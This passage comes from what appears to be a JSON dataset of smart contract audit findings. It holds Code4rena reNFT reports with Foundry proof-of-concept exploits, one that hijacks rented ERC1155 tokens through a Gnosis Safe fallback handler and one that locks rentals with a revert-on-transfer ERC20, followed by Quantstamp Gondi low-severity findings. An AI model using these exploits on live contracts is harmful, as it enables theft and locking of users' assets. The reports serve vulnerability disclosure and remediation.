payRentalOrder.seaportOrderHash,\n                    payRentalOrder.items,\n                    payRentalOrder.hooks,\n                    payRentalOrder.orderType,\n                    payRentalOrder.lender,\n                    payRentalOrder.renter,\n                    payRentalOrder.rentalWallet,\n                    payRentalOrder.startTimestamp,\n                    payRentalOrder.endTimestamp\n                );\n            }\n\n            // the offerer of the PAYEE order fulfills the orders.\n            vm.prank(fulfiller.addr);\n\n            // fulfill the orders\n            seaport.matchAdvancedOrders(\n                _deconstructOrdersToFulfill(),\n                new CriteriaResolver[](0),\n                seaportMatchOrderFulfillments,\n                seaportRecipient\n            );\n\n            // clear structs\n            resetFulfiller();\n            resetOrdersToFulfill();\n            resetSeaportMatchOrderFulfillments();\n        }\n\n        function finalizePayOrderFulfillment()\n            internal\n            returns (RentalOrder memory payRentalOrder, RentalOrder memory payeeRentalOrder)\n        {\n            (payRentalOrder, payeeRentalOrder) = _finalizePayOrderFulfillment(bytes(\"\"));\n        }\n\n        function finalizePayOrderFulfillmentWithError(\n            bytes memory expectedError\n        )\n            internal\n            returns (RentalOrder memory payRentalOrder, RentalOrder memory payeeRentalOrder)\n        {\n            (payRentalOrder, payeeRentalOrder) = _finalizePayOrderFulfillment(expectedError);\n        }\n\n        function _finalizeBaseOrderFulfillment(\n            bytes memory expectedError\n        ) private returns (RentalOrder memory rentalOrder) {\n            // get the order to fulfill\n            OrderToFulfill memory baseOrder = ordersToFulfill[0];\n\n            // create a rental order\n            rentalOrder = _createRentalOrder(baseOrder);\n\n            // expect an error if error data was provided\n            if (expectedError.length != 0) {\n                vm.expectRevert(expectedError);\n            }\n            // otherwise, expect the relevant event to be emitted.\n            else {\n                vm.expectEmit({emitter: address(create)});\n                emit Events.RentalOrderStarted(\n                    create.getRentalOrderHash(rentalOrder),\n                    baseOrder.payload.metadata.emittedExtraData,\n                    rentalOrder.seaportOrderHash,\n                    rentalOrder.items,\n                    rentalOrder.hooks,\n                    rentalOrder.orderType,\n                    rentalOrder.lender,\n                    rentalOrder.renter,\n                    rentalOrder.rentalWallet,\n                    rentalOrder.startTimestamp,\n                    rentalOrder.endTimestamp\n                );\n            }\n\n            // the owner of the rental wallet fulfills the advanced order, and marks the rental wallet\n            // as the recipient\n            vm.prank(fulfiller.addr);\n            seaport.fulfillAdvancedOrder(\n                baseOrder.advancedOrder,\n                new CriteriaResolver[](0),\n                conduitKey,\n                seaportRecipient\n            );\n\n            // clear structs\n            resetFulfiller();\n            resetOrdersToFulfill();\n            resetSeaportMatchOrderFulfillments();\n        }\n\n        function finalizeBaseOrderFulfillment()\n            internal\n            returns (RentalOrder memory rentalOrder)\n        {\n            rentalOrder = _finalizeBaseOrderFulfillment(bytes(\"\"));\n        }\n\n        function finalizeBaseOrderFulfillmentWithError(\n            bytes memory expectedError\n        ) internal returns (RentalOrder memory rentalOrder) {\n            rentalOrder = _finalizeBaseOrderFulfillment(expectedError);\n        }\n\n        function finalizeBaseOrdersFulfillment()\n            internal\n            returns (RentalOrder[] memory rentalOrders)\n        {\n            // Instantiate rental orders\n            uint256 numOrdersToFulfill = ordersToFulfill.length;\n            rentalOrders = new RentalOrder[](numOrdersToFulfill);\n\n            // convert each order to fulfill into a rental order\n            for (uint256 i = 0; i < numOrdersToFulfill; i++) {\n                rentalOrders[i] = _createRentalOrder(ordersToFulfill[i]);\n            }\n\n            // Expect the relevant events to be emitted.\n            for (uint256 i = 0; i < rentalOrders.length; i++) {\n                vm.expectEmit({emitter: address(create)});\n                emit Events.RentalOrderStarted(\n                    create.getRentalOrderHash(rentalOrders[i]),\n                    ordersToFulfill[i].payload.metadata.emittedExtraData,\n                    rentalOrders[i].seaportOrderHash,\n                    rentalOrders[i].items,\n                    rentalOrders[i].hooks,\n                    rentalOrders[i].orderType,\n                    rentalOrders[i].lender,\n                    rentalOrders[i].renter,\n                    rentalOrders[i].rentalWallet,\n                    rentalOrders[i].startTimestamp,\n                    rentalOrders[i].endTimestamp\n                );\n            }\n\n            // the owner of the rental wallet fulfills the advanced orders, and marks the rental wallet\n            // as the recipient\n            vm.prank(fulfiller.addr);\n            seaport.fulfillAvailableAdvancedOrders(\n                _deconstructOrdersToFulfill(),\n                new CriteriaResolver[](0),\n                seaportOfferFulfillments,\n                seaportConsiderationFulfillments,\n                conduitKey,\n                seaportRecipient,\n                ordersToFulfill.length\n            );\n\n            // clear structs\n            resetFulfiller();\n            resetOrdersToFulfill();\n            resetSeaportMatchOrderFulfillments();\n        }\n\n        function finalizePayOrdersFulfillment()\n            internal\n            returns (RentalOrder[] memory rentalOrders)\n        {\n            // Instantiate rental orders\n            uint256 numOrdersToFulfill = ordersToFulfill.length;\n            rentalOrders = new RentalOrder[](numOrdersToFulfill);\n\n            // convert each order to fulfill into a rental order\n            for (uint256 i = 0; i < numOrdersToFulfill; i++) {\n                rentalOrders[i] = _createRentalOrder(ordersToFulfill[i]);\n            }\n\n            // Expect the relevant events to be emitted.\n            for (uint256 i = 0; i < rentalOrders.length; i++) {\n                // only expect the event if its a PAY order\n                if (ordersToFulfill[i].payload.metadata.orderType == OrderType.PAY) {\n                    vm.expectEmit({emitter: address(create)});\n                    emit Events.RentalOrderStarted(\n                        create.getRentalOrderHash(rentalOrders[i]),\n                        ordersToFulfill[i].payload.metadata.emittedExtraData,\n                        rentalOrders[i].seaportOrderHash,\n                        rentalOrders[i].items,\n                        rentalOrders[i].hooks,\n                        rentalOrders[i].orderType,\n                        rentalOrders[i].lender,\n                        rentalOrders[i].renter,\n                        rentalOrders[i].rentalWallet,\n                        rentalOrders[i].startTimestamp,\n                        rentalOrders[i].endTimestamp\n                    );\n                }\n            }\n\n            // the offerer of the PAYEE order fulfills the orders. For this order, it shouldn't matter\n            // what the recipient address is\n            vm.prank(fulfiller.addr);\n            seaport.matchAdvancedOrders(\n                _deconstructOrdersToFulfill(),\n                new CriteriaResolver[](0),\n                seaportMatchOrderFulfillments,\n                seaportRecipient\n            );\n\n            // clear structs\n            resetFulfiller();\n            resetOrdersToFulfill();\n            resetSeaportMatchOrderFulfillments();\n        }\n\n        function _deconstructOrdersToFulfill()\n            private\n            view\n            returns (AdvancedOrder[] memory advancedOrders)\n        {\n            // get the length of the orders to fulfill\n            advancedOrders = new AdvancedOrder[](ordersToFulfill.length);\n\n            // build up the advanced orders\n            for (uint256 i = 0; i < ordersToFulfill.length; i++) {\n                advancedOrders[i] = ordersToFulfill[i].advancedOrder;\n            }\n        }\n    }\n\n    contract SetupReNFT is OrderFulfiller {}\n\n</details>\n\n<details>\n<summary><b>Exploit.sol</b></summary>\n<br>\n\n    // SPDX-License-Identifier: BUSL-1.1\n    pragma solidity ^0.8.20;\n\n    import {\n        Order,\n        FulfillmentComponent,\n        Fulfillment,\n        ItemType as SeaportItemType\n    } from \"@seaport-types/lib/ConsiderationStructs.sol\";\n\n    import {OrderType, OrderMetadata, RentalOrder} from \"@src/libraries/RentalStructs.sol\";\n\n    import {SetupReNFT} from \"./SetupExploit.sol\";\n    import {Assertions} from \"@test/utils/Assertions.sol\";\n    import {Constants} from \"@test/utils/Constants.sol\";\n    import {SafeUtils} from \"@test/utils/GnosisSafeUtils.sol\";\n    import {Enum} from \"@safe-contracts/common/Enum.sol\";\n    import \"forge-std/console.sol\";\n\n\n\n    contract Exploit is SetupReNFT, Assertions, Constants {\n\n        function test_ERC721_1155_Exploit() public {\n\n            vm.stopPrank();\n\n            /////////////////////////////////////////////\n            // Order Creation & Fulfillment simulation //\n            /////////////////////////////////////////////\n\n            // Alice creates a BASE order\n            createOrder({\n                offerer: alice,\n                orderType: OrderType.BASE,\n                erc721Offers: 0,\n                erc1155Offers: 1,\n                erc20Offers: 0,\n                erc721Considerations: 0,\n                erc1155Considerations: 0,\n                erc20Considerations: 1\n            });\n\n            // Finalize the order creation\n            (\n                Order memory order,\n                bytes32 orderHash,\n                OrderMetadata memory metadata\n            ) = finalizeOrder();\n            \n\n            // Create an order fulfillment\n            createOrderFulfillment({\n                _fulfiller: attacker,\n                order: order,\n                orderHash: orderHash,\n                metadata: metadata\n            });\n\n            // Finalize the base order fulfillment\n            RentalOrder memory rentalOrder = finalizeBaseOrderFulfillment();\n\n            // get the rental order hash\n            bytes32 rentalOrderHash = create.getRentalOrderHash(rentalOrder);\n\n\n            // Assert that the rental order was stored\n            assertEq(STORE.orders(rentalOrderHash), true);\n\n            // Assert that the token is in storage\n            assertEq(STORE.isRentedOut(address(attacker.safe), address(erc1155s[0]), 0), true);\n\n            // assert that the fulfiller made a payment\n            assertEq(erc20s[0].balanceOf(attacker.addr), uint256(9900));\n\n            // assert that a payment was made to the escrow contract\n            assertEq(erc20s[0].balanceOf(address(ESCRW)), uint256(100));\n\n            // assert that a payment was synced properly in the escrow contract\n            assertEq(ESCRW.balanceOf(address(erc20s[0])), uint256(100));\n\n\n            // Impersonate the attacker\n            vm.startPrank(attacker.addr);\n\n            // The `setFallbackHandler` TX\n            bytes memory transaction = abi.encodeWithSelector(\n                Safe.setFallbackHandler.selector,\n                address(address(erc1155s[0]))\n            );\n\n            // The signature of the `setFallbackHandler` TX\n            bytes memory transactionSignature = SafeUtils.signTransaction(\n                address(attacker.safe),\n                attacker.privateKey,\n                address(attacker.safe),\n                transaction\n            );\n\n            // Execute the transaction on attacker's safe\n            SafeUtils.executeTransaction(\n                address(attacker.safe),\n                address(attacker.safe),\n                transaction,\n                transactionSignature\n            );\n\n            /** ----------------- Exploitation ----------------- */\n\n            // TX calldata\n            bytes memory hijackTX = abi.encodeWithSignature(\n                \"safeTransferFrom(address,address,uint256,uint256,bytes)\",\n                address(attacker.safe),\n                address(attacker.addr),\n                0,\n                100,\n                \"\"\n            );\n\n            // The exploit\n            (bool tx_success, ) = address(attacker.safe).call(\n                hijackTX\n            );\n\n\n            /** ----------------- Exploit proof ----------------- */\n\n            uint256 attackersBalance = erc1155s[0].balanceOf(address(attacker.addr), 0);\n            uint256 attackersSafeBalance = erc1155s[0].balanceOf(address(attacker.safe), 0);\n\n            if (tx_success && attackersSafeBalance == uint256(0) && attackersBalance == uint256(100)) {\n                console.log(\"Tokens successfully hijacked from the attacker's (borrower) safe!\");\n            }\n\n\n        }\n\n    }\n\n\n    interface Safe {\n        function execTransaction(\n            address to,\n            uint256 value,\n            bytes calldata data,\n            Enum.Operation operation,\n            uint256 safeTxGas,\n            uint256 baseGas,\n            uint256 gasPrice,\n            address gasToken,\n            address payable refundReceiver,\n            bytes memory signatures\n        ) external payable returns (bool success);\n\n        function setFallbackHandler(address handler) external;\n    }\n\n</details>\n\n***\n\n### Impact\n\n***\n\nThis severe vulnerability allows an attacker to hijack ANY ERC721 or ERC1155 tokens he rents.\n\n***\n\n### Remediation\n\n***\n\nIn the guard, check if the TX is a call to the function `setFallbackHandler()`. If it is, then ensure that the address supplied to that function is not an address of an actively rented ERC721/1155 token.\nAdditionally, if the borrower rents a new token, ensure that the already set fallback handler address isn't the same as the newly-rented token address.\n\n***\n\n**[0xean (Judge) commented](https://github.com/code-423n4/2024-01-renft-findings/issues/593#issuecomment-1912610639):**\n > H seems appropriate here, direct loss of assets. \n\n**[Alec1017 (reNFT) confirmed and commented](https://github.com/code-423n4/2024-01-renft-findings/issues/593#issuecomment-1914950594):**\n > PoC on this one was confirmed. Direct loss of assets.\n\n**[reNFT mitigated](https://github.com/code-423n4/2024-02-renft-mitigation?tab=readme-ov-file#mitigations-to-be-reviewed):**\n> The PR [here](https://github.com/re-nft/smart-contracts/pull/4) - Adds check to prevent setting of the fallback handler by the safe owner.\n\n**Status:** Mitigation confirmed. Full details in reports from [EV_om](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/42), [sin1st3r__](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/31) and [juancito](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/3).\n\n***\n\n",
      "summary": "\nThe report discusses two features of the Gnosis safe: fallback handlers and guards. Fallback handlers allow for flexibility in handling unknown functions, while guards act as a defense against malicious function calls. However, the report highlights a vulnerability in the guard feature that allows an attacker to hijack any ERC721 or ERC1155 token rented through the safe. The steps to exploit this vulnerability are outlined, and a proof of concept is provided. To run the proof of concept, specific files must be added to the test folder and a command must be run. The report concludes by mentioning the need for validation and checks in the `setFallbackHandler()` function to prevent such attacks.",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "reNFT",
      "source_link": "https://code4rena.com/reports/2024-01-renft",
      "github_link": "https://github.com/code-423n4/2024-01-renft-findings/issues/593",
      "tags": [
        "ERC1155",
        "ERC721"
      ],
      "finders": [
        "sin1st3r\\_\\_",
        "juancito",
        "marqymarq10",
        "EV\\_om",
        "0xR360",
        "haxatron",
        "hash",
        "israeladelaja",
        "Lirios",
        "zzzitron",
        "0xAlix2",
        "Beepidibop",
        "alix40",
        "0xDING99YA",
        "a3yip6"
      ]
    },
    {
      "id": "30521",
      "title": "[H-01] All orders can be hijacked to lock rental assets forever by tipping a malicious ERC20",
      "impact": "HIGH",
      "content": "\nThe `Create` contract is responsible for creating a rental. It achieves this by acting as a Seaport `Zone`, and storing and validating orders as rentals when they are fulfilled on Seaport.\n\nHowever, one thing it doesn't account for is the fact that Seaport allows for \"tipping\" in the form of ERC20 tokens as part of the order fulfillment process. This is done by extending the `consideration` array in the order with additional ERC20 tokens.\n\nFrom the Seaport [docs](https://docs.opensea.io/reference/seaport-overview#order) (emphasis mine):\n\n> The `consideration` contains an array of items that must be received in order to fulfill the order. It contains all of the same components as an offered item, and additionally includes a `recipient` that will receive each item. This array **may be extended by the fulfiller on order fulfillment so as to support \"tipping\"** (e.g. relayer or referral payments).\n\nThis other passage, while discussing a different issue, even highlights the root cause of this vulnerability (the zone does not properly allocate consideration extensions):\n\n> As extensions to the consideration array on fulfillment (i.e. \"tipping\") can be arbitrarily set by the caller, fulfillments where all matched orders have already been signed for or validated can be frontrun on submission, with the frontrunner modifying any tips. Therefore, it is important that orders fulfilled in this manner either leverage \"restricted\" order types with a **zone that enforces appropriate allocation of consideration extensions**, or that each offer item is fully spent and each consideration item is appropriately declared on order creation.\n\nLet's dive in and see how tipping works exactly. We know fulfillers may use the entry points listed [here](https://github.com/code-423n4/2024-01-renft/blob/75e7b44af9482b760aa4da59bc776929d1e022b0/docs/fulfilling-a-rental.md#overview), the first of which is simply a wrapper to [`_validateAndFulfillAdvancedOrder()`](https://github.com/re-nft/seaport-core/blob/3bccb8e1da43cbd9925e97cf59cb17c25d1eaf95/src/lib/OrderFulfiller.sol#L78C14-L78C46). This function calls [`_validateOrderAndUpdateStatus()`](https://github.com/re-nft/seaport-core/blob/3bccb8e1da43cbd9925e97cf59cb17c25d1eaf95/src/lib/OrderValidator.sol#L135) , which derives the order hash by calling [`_assertConsiderationLengthAndGetOrderHash()`](https://github.com/ProjectOpenSea/seaport-core/blob/main/src/lib/Assertions.sol#L69). At the end of the trail, we can see that the order hash is finally derived in [`_deriveOrderHash()`](https://github.com/ProjectOpenSea/seaport-core/blob/main/src/lib/GettersAndDerivers.sol#L64) from other order parameters as well as the consideration array, but [only up to](https://github.com/ProjectOpenSea/seaport-core/blob/main/src/lib/GettersAndDerivers.sol#L142)  the `totalOriginalConsiderationItems` value in the `parameters` of the [`AdvancedOrder`](https://github.com/ProjectOpenSea/seaport-types/blob/25bae8ddfa8709e5c51ab429fe06024e46a18f15/src/lib/ConsiderationStructs.sol#L174) passed by the fulfiller as argument. This value reflects the original length of the consideration items in the order. <br><https://github.com/ProjectOpenSea/seaport-types/blob/25bae8ddfa8709e5c51ab429fe06024e46a18f15/src/lib/ConsiderationStructs.sol#L143-L156>\n\n```solidity\nstruct OrderParameters {\n    address offerer; // 0x00\n    address zone; // 0x20\n    OfferItem[] offer; // 0x40\n    ConsiderationItem[] consideration; // 0x60\n    OrderType orderType; // 0x80\n    uint256 startTime; // 0xa0\n    uint256 endTime; // 0xc0\n    bytes32 zoneHash; // 0xe0\n    uint256 salt; // 0x100\n    bytes32 conduitKey; // 0x120\n    uint256 totalOriginalConsiderationItems; // 0x140\n    // offer.length                          // 0x160\n}\n```\n\nThus we can see that when deriving the order hash the extra consideration items are ignored, which is what allows the original signature of the offerer to match. However, in the [`ZoneParameters`](https://github.com/re-nft/seaport-core/blob/3bccb8e1da43cbd9925e97cf59cb17c25d1eaf95/src/lib/rental/ConsiderationStructs.sol#L21) passed on to the zone, all consideration items are included in one array, and there is no obvious way to distinguish tips from original items:\n\n```solidity\nstruct ZoneParameters {\n    bytes32 orderHash;\n    address fulfiller;\n    address offerer;\n    SpentItem[] offer;\n    ReceivedItem[] consideration;\n    // the next struct member is only available in the project's fork\n    ReceivedItem[] totalExecutions;\n    bytes extraData;\n    bytes32[] orderHashes;\n    uint256 startTime;\n    uint256 endTime;\n    bytes32 zoneHash;\n}\n```\n\nFinally, while the `validateOrder()` function in the `Create` contract verifies that the order fulfillment has been signed by the reNFT signer, the signed `RentPayload` does not depend on the consideration items, hence tipping is still possible.\n\nThe vulnerability arises when this capability is exploited to add a malicious ERC20 token to the `consideration` array. This malicious token can be designed to revert on transfer, causing the rental stop process to fail. As a result, the rented assets remain locked in the rental safe indefinitely.\n\n### Proof of Concept\n\nWe can validate the vulnerability through an additional test case for the `Rent.t.sol` test file. This test case will simulate the exploit scenario and confirm the issue by performing the following actions:\n\n1.  Create a `BASE` order with Alice as the offerer.\n2.  Finalize the order creation.\n3.  Create an order fulfillment with Bob as the fulfiller.\n4.  Append a malicious ERC20 token to the `consideration` array of the order.\n5.  Finalize the order fulfillment.\n6.  Attempt to stop the rent, which will fail due to the revert on transfer from the escrow.\n\nA simple exploit contract could look as follows:\n\n```solidity\npragma solidity ^0.8.20;\n\nimport {ERC20} from \"@openzeppelin-contracts/token/ERC20/ERC20.sol\";\n\n// This mock ERC20 will always revert on `transfer`\ncontract MockRevertOnTransferERC20 is ERC20 {\n    constructor() ERC20(\"MockAlwaysRevertERC20\", \"M_AR_ERC20\") {}\n\n    function mint(address to, uint256 amount) public {\n        _mint(to, amount);\n    }\n\n    function burn(address to, uint256 amount) public {\n        _burn(to, amount);\n    }\n\n    function transfer(address, uint256) public pure override returns (bool) {\n        require(false, \"transfer() revert\");\n        return false;\n    }\n}\n```\n\nAnd the test:\n\n<details>\n\n```solidity\nimport {\n    Order,\n    OrderParameters,\n    ConsiderationItem,\n    ItemType,\n    FulfillmentComponent,\n    Fulfillment,\n    ItemType as SeaportItemType\n} from \"@seaport-types/lib/ConsiderationStructs.sol\";\nimport {MockRevertOnTransferERC20} from \"@test/mocks/tokens/weird/MockRevertOnTransferERC20.sol\";\n\n    function test_Vuln_OrderHijackingByTippingMaliciousERC20() public {\n        // create a BASE order\n        createOrder({\n            offerer: alice,\n            orderType: OrderType.BASE,\n            erc721Offers: 1,\n            erc1155Offers: 0,\n            erc20Offers: 0,\n            erc721Considerations: 0,\n            erc1155Considerations: 0,\n            erc20Considerations: 1\n        });\n\n        // finalize the order creation\n        (\n            Order memory order,\n            bytes32 orderHash,\n            OrderMetadata memory metadata\n        ) = finalizeOrder();\n\n        // create an order fulfillment\n        createOrderFulfillment({\n            _fulfiller: bob,\n            order: order,\n            orderHash: orderHash,\n            metadata: metadata\n        });\n        // ------- Identical to existing \"test_Success_Rent_BaseOrder_ERC721\" until here -------\n        \n        MockRevertOnTransferERC20 exploitErc20 = new MockRevertOnTransferERC20();\n        // Seaport enforces non-zero quantities + approvals\n        exploitErc20.mint(bob.addr, 100);\n        vm.prank(bob.addr);\n        exploitErc20.approve(address(conduit), type(uint256).max);\n\n        // we acccess baseOrder.advancedOrder and add a consideration item\n        OrderParameters storage params = ordersToFulfill[0].advancedOrder.parameters;\n        params.consideration.push(ConsiderationItem({\n            itemType: ItemType.ERC20,\n            token: address(exploitErc20),\n            identifierOrCriteria: 0,\n            startAmount: 100,\n            endAmount: 100,\n            recipient: payable(address(ESCRW))\n        }));\n\n        // finalize the base order fulfillment\n        RentalOrder memory rentalOrder = finalizeBaseOrderFulfillment();\n\n        // speed up in time past the rental expiration\n        vm.warp(block.timestamp + 750);\n\n        // rental cannot be stopped since transfer from escrow will always revert\n        vm.prank(bob.addr);\n        vm.expectRevert(\n            abi.encodeWithSelector(\n                Errors.PaymentEscrowModule_PaymentTransferFailed.selector,\n                exploitErc20,\n                alice.addr,\n                100\n            )\n        );\n        stop.stopRent(rentalOrder);\n    }\n```\n\n</details>\n\nTo run the exploit test:\n\n*   Save the exploit contract as `test/mocks/tokens/weird/MockRevertOnTransferERC20.sol`.\n*   Add the test to the `Rent.t.sol` test file and run it using the command `forge test --mt test_Vuln_OrderHijackingByTippingMaliciousERC20`. This will run the test above, which should demonstrate the exploit by successfully appending a malicious ERC20 to an existing order and starting a rental that cannot be stopped.\n\n### Tools Used\n\nFoundry\n\n### Recommended Mitigation Steps\n\nDisallow tipping, either by removing this functionality in the Seaport fork or, if this isn't possible, perhaps by adding the size of the consideration items to the `ZoneParameters` and reverting if there are more. This would prevent the addition of malicious ERC20 tokens to the `consideration` array, thereby preventing the hijacking of orders and the indefinite locking of rented assets in the rental safe.\n\n**[Alec1017 (reNFT) confirmed](https://github.com/code-423n4/2024-01-renft-findings/issues/614#issuecomment-1922071817)**\n\n**[reNFT mitigated](https://github.com/code-423n4/2024-02-renft-mitigation?tab=readme-ov-file#mitigations-to-be-reviewed):**\n> The PR [here](https://github.com/re-nft/smart-contracts/pull/7) - Implements a whitelist so only granted assets can be used in the protocol.<br>\n> The PR [here](https://github.com/re-nft/smart-contracts/pull/17) - Implements batching functionality for whitelisting tokens so that multiple can be added at once.\n\n**Status:** Mitigation confirmed. Full details in reports from [juancito](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/2), [EV_om](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/41) and [sin1st3r__](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/30).\n***\n\n",
      "summary": "\nThe `Create` contract is responsible for creating rentals on Seaport. However, it does not account for the fact that Seaport allows for \"tipping\" in the form of ERC20 tokens during order fulfillment. This vulnerability allows for the addition of malicious ERC20 tokens, which can cause the rental stop process to fail and assets to remain locked indefinitely. The vulnerability can be exploited by adding a malicious ERC20 token to the `consideration` array and can be demonstrated through a test case. The recommended mitigation is to disallow tipping or implement a whitelist for tokens used in the protocol. The vulnerability has been confirmed and mitigated by the reNFT team. ",
      "quality_score": 3,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "reNFT",
      "source_link": "https://code4rena.com/reports/2024-01-renft",
      "github_link": "https://github.com/code-423n4/2024-01-renft-findings/issues/614",
      "tags": [
        "Missing-Logic"
      ],
      "finders": [
        "0xDING99YA",
        "EV\\_om"
      ]
    },
    {
      "id": "60044",
      "title": "Unlocked Pragma",
      "impact": "LOW",
      "content": "**Update**\nThe client acknowledged the issue.\n\n**Description:** Every Solidity file specifies in the header a version number of the format `pragma solidity (^)0.8.*`. The caret (`^`) before the version number implies an unlocked pragma, meaning that the compiler will use the specified version _and above_, hence the term \"unlocked\".\n\n**Recommendation:** For consistency and to prevent unexpected behavior in the future, we recommend to remove the caret to lock the file onto a specific Solidity version.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Quantstamp",
      "protocol_name": "Gondi",
      "source_link": "https://certificate.quantstamp.com/full/gondi/43da11ee-5eec-406b-95e4-4fbf423fc2cc/index.html",
      "github_link": "",
      "tags": [],
      "finders": [
        "Ibrahim Abouzied",
        "Julio Aguliar",
        "Ruben Koch"
      ]
    },
    {
      "id": "60043",
      "title": "Incompatibility with Non-Standard Tokens",
      "impact": "LOW",
      "content": "**Update**\nThe client acknowledged the issue with the following explanation:\n\n> \"Not a problem.\"\n\n**Description:** In general, the protocol has minor limits on what the token can be supported to interact:\n\n*   The protocol does not support token charging fees on transfers: Such tokens could cause all protocol interactions to revert, as the accounting relies on the complete flow of funds specified in transfers. \n*   The protocol does not support rebaseable tokens: the `UserVault`and the `AuctionLoanLiquidator` contract maintain the accounting of token balances in state variables. Tokens with elastic supply (also known as rebasing tokens) and tokens with dishonest implementation would not be compatible with the logic intended by this contract.\n*   Even though reentrancy guards are used within the protocol, we would strongly discourage the usage of any ERC777 token or any other ERC20 with hooks on transfers.\n\n**Recommendation:** It is imperative that the team understands the implementation of the ERC20 tokens used within this protocol, and attests to their compatibility before whitelisting the tokens in the protocol.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Quantstamp",
      "protocol_name": "Gondi",
      "source_link": "https://certificate.quantstamp.com/full/gondi/43da11ee-5eec-406b-95e4-4fbf423fc2cc/index.html",
      "github_link": "",
      "tags": [],
      "finders": [
        "Ibrahim Abouzied",
        "Julio Aguliar",
        "Ruben Koch"
      ]
    },
    {
      "id": "60042",
      "title": "Liquidation Process Can Be Denied",
      "impact": "LOW",
      "content": "**Update**\nMarked as \"Fixed\" by the client. Addressed in: `90daa9287068fbfe5768b3281be06ee7294a25ee`. The client provided the following explanation:\n\n> \"Changed to `transferFrom()`\"\n\n**File(s) affected:**`AuctionLoanLiquidator.sol`\n\n**Description:** There can be a DoS if the winner of the auction of an NFT collateral from a liquidation of a partial loan reverts the `onERC721Received()` callback, as it is distributed via the `safeTransferFrom()` as part of the liquidation process.\n\nA successful bidder of an NFT collateral resulting from the liquidation of a loan with multiple principal sources can deny the payout of the tokens by manipulating the `onERC721Received()` callback, as a transfer of the collateral to the bidder via `safeTransferFrom()` is attempted as part of the liquidation process.\n\nThis would result in both the bid and the NFT being permanently frozen, so there is little incentive for a bidder to perform such an attack, but it would still stop lenders from receiving any liquidation proceeds.\n\n**Recommendation:** Switch to a pull mechanism for the withdrawal of the NFT for the winning bidder.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Quantstamp",
      "protocol_name": "Gondi",
      "source_link": "https://certificate.quantstamp.com/full/gondi/43da11ee-5eec-406b-95e4-4fbf423fc2cc/index.html",
      "github_link": "",
      "tags": [],
      "finders": [
        "Ibrahim Abouzied",
        "Julio Aguliar",
        "Ruben Koch"
      ]
    },
    {
      "id": "60041",
      "title": "Loans Have Overly Constrained Capacity",
      "impact": "LOW",
      "content": "**Update**\nMarked as \"Fixed\" by the client. Addressed in: `c858936fe217a562d396483b14f1876b9fb3b69f`.\n\n**File(s) affected:**`BaseLoan.sol`\n\n**Description:** A lender can propose a loan offer on a collection, allowing for multiple loans to be withdrawn up to a designated `capacity`. `_validateExecutionData()` validates that a new loan has not exceeded the lender's capacity.\n\nHowever, it checks for whether withdrawing the full `offer.principalAmount` would exceed the capacity, rather than the `executionData.amount` (the actual value that the borrower will be lent). This would prevent the execution of the loan, despite the possibility of the `executionData.amount` remaining within the lender's capacity.\n\n**Recommendation:** Update the validation for the loan offer's capacity to use `executionData.amount` rather than `offer.principalAmount`.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Quantstamp",
      "protocol_name": "Gondi",
      "source_link": "https://certificate.quantstamp.com/full/gondi/43da11ee-5eec-406b-95e4-4fbf423fc2cc/index.html",
      "github_link": "",
      "tags": [],
      "finders": [
        "Ibrahim Abouzied",
        "Julio Aguliar",
        "Ruben Koch"
      ]
    },
    {
      "id": "60040",
      "title": "Critical Role Transfer Not Following Two-Step Pattern",
      "impact": "LOW",
      "content": "**Update**\nThe client acknowledged the issue.\n\n**File(s) affected:**`Leverage.sol`, `BaseLoan.sol`, `AddressManager.sol`, `AuctionLoanLiquidator.sol`\n\n**Description:**`Solmate/Owned` allows the owner of the inheriting contracts to call `transferOwnership()` to transfer the ownership to a new address. If an uncontrollable address is accidentally provided as the new owner address then the contract will no longer have an active owner, and functions with the `onlyOwner` modifier can no longer be executed.\n\n**Recommendation:** Consider using OpenZeppelin's `Ownable2Step` contract to adopt a two-step ownership pattern in which the new owner must accept their position before the transfer is complete. Alternatively, add a mechanism similar to e.g. the updating of the variable containing the address of the `MultiSourceLoan` contract in the `Leverage` contract, where both `updateMultiSourceLoanAddressFirst()` and `finalUpdateMultiSourceLoanAddress()` have to be called separately with the correct parameters for the variable to be fully updated.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Quantstamp",
      "protocol_name": "Gondi",
      "source_link": "https://certificate.quantstamp.com/full/gondi/43da11ee-5eec-406b-95e4-4fbf423fc2cc/index.html",
      "github_link": "",
      "tags": [],
      "finders": [
        "Ibrahim Abouzied",
        "Julio Aguliar",
        "Ruben Koch"
      ]
    },
    {
      "id": "60039",
      "title": "Missing Input Validation",
      "impact": "LOW",
      "content": "**Update**\nSome of the recommendations have been implemented in commit `90daa9287068fbfe5768b3281be06ee7294a25ee`.\n\n**Description:** It is important to validate inputs, even if they only come from trusted addresses, to avoid human error. Specifically, in the following functions arguments could could benefit from additional input validation:\n\n1.   Generally, in constructors, address parameters, especially if used to assign immutable variables, should be checked to be unequal to zero. Furthermore, all assignments of global state variable that have matching setters should make use of those setters to leverage the existing input validation.\n2.   `Leverage.updateMultiSourceLoanAddressFirst()`: Validate that `_newAddress` is non-zero.\n3.   `Leverage.updateSeaportAddressFirst()`: Validate that `_newAddress` is non-zero.\n4.   `BaseLoan.updateImprovementMinimum()`: Validate that `_newMinimum` is non-zero to not enable refinances with identical APR.\n5.   `BaseLoan.updateLiquidationAuctionDuration()`: The function allows the auction duration to be `zero`. Consider adding a minimum check.\n6.   `BaseLoan.updateImprovementMinimum()`: Validate its input against some minimum values. According to the documentation, these should be `1%` principal amount increase, `1%` interest decrease, or `10%` duration increase. \n7.   `MultiSourceLoan.setMaxSources()`: Validate that `maxSources` is non-zero and have a reasonable hardcoded upper bound to not cause block gas limit concerns in their processing.\n8.   